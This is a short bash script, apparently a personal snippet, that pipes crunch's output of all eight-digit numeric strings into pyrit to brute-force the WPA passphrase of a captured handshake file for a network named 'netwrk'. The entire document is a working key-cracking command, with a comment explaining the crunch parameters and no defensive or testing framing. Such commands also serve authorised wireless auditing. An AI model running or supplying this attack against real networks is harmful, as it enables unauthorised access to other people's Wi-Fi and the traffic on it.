#!/bin/bash
# crunch parametres: 8 8 - min, max lenth,  -t - regex, numeric - gen only numbers ( also can be ... ),   
crunch 8 8 -t %%%%%%%% numeric | pyrit -r capt-01.cap -e netwrk -i - attack_passthrough
